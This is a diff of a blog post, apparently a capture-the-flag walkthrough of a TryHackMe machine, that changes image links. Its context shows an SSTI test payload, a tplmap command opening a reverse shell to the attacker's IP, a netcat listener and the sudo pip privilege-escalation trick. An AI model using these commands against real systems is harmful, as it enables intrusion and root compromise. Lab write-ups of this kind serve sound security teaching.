@@ -139,15 +139,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre><p>We got 4 open ports, 22,80,2222,9090. Let&rsquo;s take a look at it one by one. First, nothing special about port 22. Next, port 80 is running website, must be there for a reason. Third, Port 2222 looks like running a unknown service, leave it first. Last, port 9090 running website using Tornado with version 6.0.3.</p>
 <h3 id="port-80">Port 80</h3>
 <p>Looking at port 80 website&rsquo;s source code, we found a potential hint. Looks like hinting about buffer overflow.</p>
-<p><img src="_resources/3f64f75b1b6315cc94044f566a13328e.png" alt="/posts/thm-nonamectf/_resources/3f64f75b1b6315cc94044f566a13328e.png"></p>
+<p><img src="/img/thm-nonamectf/3f64f75b1b6315cc94044f566a13328e.png" alt="IMG"></p>
 <h3 id="port-2222">Port 2222</h3>
 <p>Looking at port 2222, we can try connect to it via netcat:</p>
 <pre tabindex="0"><code>nc &lt;ip&gt; 2222
 </code></pre><p>Looks like it is providing some services. The <strong>get_secret_directory</strong> looks interesting but it was prompting us to login before using that service. We will come back to this later.</p>
-<p><img src="_resources/c54ca29dcc6d143e6046d2661b512fe7.png" alt="/posts/thm-nonamectf/_resources/c54ca29dcc6d143e6046d2661b512fe7.png"></p>
+<p><img src="/img/thm-nonamectf/c54ca29dcc6d143e6046d2661b512fe7.png" alt="IMG2"></p>
 <h3 id="port-9090">Port 9090</h3>
 <p>Upon browsing to port 9090 website, we&rsquo;ve encountered an error.</p>
-<p><img src="_resources/6667948cfd36e9a2914a933b392fe3b9.png" alt="/posts/thm-nonamectf/_resources/6667948cfd36e9a2914a933b392fe3b9.png"></p>
+<p><img src="/img/thm-nonamectf/6667948cfd36e9a2914a933b392fe3b9.png" alt="IMG3"></p>
 <p>For now we have gathered some initial information about each open ports. Let&rsquo;s do a quick summarize, port 80 source code indicating we might need to do buffer overflow, since buffer overflow less likely will be happen in websites, let&rsquo;s now focus on port 2222.</p>
 <h3 id="exploiting-port-2222">Exploiting port 2222</h3>
 <p>Based on the port 80 source code hint given, we can guess that vulnerable point was <strong>store_your_buffer</strong> functionality and the amount of buffer to overflow it most likely will be greater than 1000. After interacting a while with it, the flow to exploit it to get secret directory probably is:</p>
@@ -217,32 +217,32 @@ My secret in the port 9090 is: /xxxxx
 <hr>
 <h2 id="initial-foothold">Initial Foothold</h2>
 <p>Let&rsquo;s browse to port 9090 website with the secret directory:</p>
-<p><img src="_resources/6ede18c18e56f998156807e30828299c.png" alt="/posts/thm-nonamectf/_resources/6ede18c18e56f998156807e30828299c.png"></p>
+<p><img src="/img/thm-nonamectf/6ede18c18e56f998156807e30828299c.png" alt="IMG4"></p>
 <p>Nothing interesting, how about the source code?</p>
-<p><img src="_resources/32599adf76a4a76c570d55a65701de96.png" alt="/posts/thm-nonamectf/_resources/32599adf76a4a76c570d55a65701de96.png"></p>
+<p><img src="/img/thm-nonamectf/32599adf76a4a76c570d55a65701de96.png" alt="IMG5"></p>
 <p>Yes ! We got a parameter hidden in source code. After some testing, looks like it was vulnerable to Server Side Template Injection (SSTI):</p>
 <pre tabindex="0"><code>http://10.10.107.235:9090/xxxxx/?hackme={{7*7}}
-</code></pre><p><img src="_resources/b0ddea2d264559572693e4cc6587e728.png" alt="/posts/thm-nonamectf/_resources/b0ddea2d264559572693e4cc6587e728.png"></p>
+</code></pre><p><img src="/img/thm-nonamectf/b0ddea2d264559572693e4cc6587e728.png" alt="IMG6"></p>
 <p>Without further ado, let&rsquo;s spawn a reverse shell using <strong>tplmap</strong>:</p>
 <h4 id="notes-if-you-have-problem-installing-tplmap-take-this-solutionhttpsblogcsdnnetweixin_46041615articledetails121111050-youre-welcome">Notes: If you have problem installing tplmap, take this: <a href="https://blog.csdn.net/weixin_46041615/article/details/121111050">solution</a>, you&rsquo;re welcome</h4>
 <pre tabindex="0"><code>python2 tplmap.py -u http://10.10.107.235:9090/xxxxx/?hackme= --reverse-shell 10.13.28.126 4567
 </code></pre><p>Setup netcat to listen on certain port:</p>
 <pre tabindex="0"><code>nc -lvnp 4567
 </code></pre><p>Execute the tplmap&rsquo;s command and BOOM ! Reverse shell achieved !</p>
-<p><img src="_resources/ac8ecc09a421a28a018da587f359cb13.png" alt="/posts/thm-nonamectf/_resources/ac8ecc09a421a28a018da587f359cb13.png"></p>
+<p><img src="/img/thm-nonamectf/ac8ecc09a421a28a018da587f359cb13.png" alt="IMG7"></p>
 <hr>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <blockquote>
 <p>Classic &lt;3 - GTFOBins</p>
 </blockquote>
 <pre tabindex="0"><code>sudo -l
-</code></pre><p><img src="_resources/abacfee0f5d6a41063588edd829a7efb.png" alt="/posts/thm-nonamectf/_resources/abacfee0f5d6a41063588edd829a7efb.png"></p>
+</code></pre><p><img src="/img/thm-nonamectf/abacfee0f5d6a41063588edd829a7efb.png" alt="IMG8"></p>
 <h3 id="exploit">Exploit</h3>
 <pre tabindex="0"><code>TF=$(mktemp -d)
 echo &quot;import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')&quot; &gt; $TF/setup.py
 sudo /usr/bin/pip install $TF
 </code></pre><h3 id="rooted-">Rooted !</h3>
-<p><img src="_resources/1ca5eba662366c1f2fcc22fbe8148980.png" alt="/posts/thm-nonamectf/_resources/1ca5eba662366c1f2fcc22fbe8148980.png"></p>
+<p><img src="/img/thm-nonamectf/1ca5eba662366c1f2fcc22fbe8148980.png" alt="IMG9"></p>
 <p>To whoever reading this till here, thank you so much and have a nice day !</p>
 
     </div>
